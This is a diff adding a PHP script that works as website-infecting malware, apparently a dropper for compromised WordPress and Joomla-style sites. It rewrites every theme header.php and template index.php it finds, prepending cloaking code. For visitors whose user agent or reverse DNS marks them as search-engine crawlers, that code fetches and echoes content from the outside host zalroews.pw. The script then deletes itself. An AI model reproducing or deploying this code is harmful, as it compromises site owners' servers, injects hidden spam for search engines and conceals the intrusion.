@@ -1,0 +1,111 @@
+<?php 
+if( isset($_REQUEST["test_url"]) ){
+echo "file test okay";
+
+}
+
+$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
+$code = '
+
+
+<?php
+$user_agent_to_filter = array( \'#Ask\s*Jeeves#i\', \'#HP\s*Web\s*PrintSmart#i\', \'#HTTrack#i\', \'#IDBot#i\', \'#Indy\s*Library#\',
+                               \'#ListChecker#i\', \'#MSIECrawler#i\', \'#NetCache#i\', \'#Nutch#i\', \'#RPT-HTTPClient#i\',
+                               \'#rulinki\.ru#i\', \'#Twiceler#i\', \'#WebAlta#i\', \'#Webster\s*Pro#i\',\'#www\.cys\.ru#i\',
+                               \'#Wysigot#i\', \'#Yahoo!\s*Slurp#i\', \'#Yeti#i\', \'#Accoona#i\', \'#CazoodleBot#i\',
+                               \'#CFNetwork#i\', \'#ConveraCrawler#i\',\'#DISCo#i\', \'#Download\s*Master#i\', \'#FAST\s*MetaWeb\s*Crawler#i\',
+                               \'#Flexum\s*spider#i\', \'#Gigabot#i\', \'#HTMLParser#i\', \'#ia_archiver#i\', \'#ichiro#i\',
+                               \'#IRLbot#i\', \'#Java#i\', \'#km\.ru\s*bot#i\', \'#kmSearchBot#i\', \'#libwww-perl#i\',
+                               \'#Lupa\.ru#i\', \'#LWP::Simple#i\', \'#lwp-trivial#i\', \'#Missigua#i\', \'#MJ12bot#i\',
+                               \'#msnbot#i\', \'#msnbot-media#i\', \'#Offline\s*Explorer#i\', \'#OmniExplorer_Bot#i\',
+                               \'#PEAR#i\', \'#psbot#i\', \'#Python#i\', \'#rulinki\.ru#i\', \'#SMILE#i\',
+                               \'#Speedy#i\', \'#Teleport\s*Pro#i\', \'#TurtleScanner#i\', \'#User-Agent#i\', \'#voyager#i\',
+                               \'#Webalta#i\', \'#WebCopier#i\', \'#WebData#i\', \'#WebZIP#i\', \'#Wget#i\',
+                               \'#Yandex#i\', \'#Yanga#i\', \'#Yeti#i\',\'#msnbot#i\',
+                               \'#spider#i\', \'#yahoo#i\', \'#jeeves#i\' ,\'#google#i\' ,\'#altavista#i\',
+                               \'#scooter#i\' ,\'#av\s*fetch#i\' ,\'#asterias#i\' ,\'#spiderthread revision#i\' ,\'#sqworm#i\',
+                               \'#ask#i\' ,\'#lycos.spider#i\' ,\'#infoseek sidewinder#i\' ,\'#ultraseek#i\' ,\'#polybot#i\',
+                               \'#webcrawler#i\', \'#robozill#i\', \'#gulliver#i\', \'#architextspider#i\', \'#yahoo!\s*slurp#i\',
+                               \'#charlotte#i\', \'#ngb#i\', \'#BingBot#i\' ) ;
+
+if ( !empty( $_SERVER[\'HTTP_USER_AGENT\'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, \'-NO-WAY-\', $_SERVER[\'HTTP_USER_AGENT\'] ), \'-NO-WAY-\' ) ) ){
+    $isbot = 1;
+	}
+
+if( FALSE !== strpos( gethostbyaddr($_SERVER[\'REMOTE_ADDR\']), \'google\')) 
+{
+    $isbot = 1;
+}
+
+if(@$isbot){
+
+$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
+$ch = curl_init();    
+    curl_setopt($ch, CURLOPT_URL, "http://zalroews.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
+    $result = curl_exec($ch);       
+curl_close ($ch);  
+
+	echo $result;
+}
+?>';
+
+
+if (file_exists("wp-content"))
+{
+if (file_exists("wp-content/themes"))
+{
+	$dirs = scandir("wp-content/themes");
+	foreach ($dirs as $dir)
+	{
+		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
+		{
+			if (file_exists("wp-content/themes/$dir/header.php")) 
+			{
+		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
+                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
+                          fclose($file);	
+               if (eregi('zalroews.pw', $buffer)==0) 
+               { 
+				 
+						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
+				             fwrite($in, $code);
+			                 fwrite($in, $buffer);
+				             fclose($in);
+				/*		 
+                   $in = fopen("wp-content/themes/$dir/header.php", "a");
+				   fwrite($in, $code);
+				   fclose($in);
+				   */
+               }
+			}
+		}
+	}
+}
+}
+
+if (file_exists("templates"))
+{
+	 $dirs = scandir("templates");
+	 	foreach ($dirs as $dir)
+	     {
+		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
+		          {
+					  if (file_exists("templates/".$dir."/index.php")) 
+					  {
+						  $file = fopen("templates/".$dir."/index.php", "r");  
+                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
+                          fclose($file);	
+                            if (eregi('zalroews.pw', $buffer)==0) 
+                                   {
+					         $in = fopen("templates/".$dir."/index.php", "w");
+				             fwrite($in, $code);
+			                 fwrite($in, $buffer);
+				             fclose($in);
+ 								   }									   
+					  }
+		          }
+	     }
+}
+
+	unlink($scriptname);
+?>
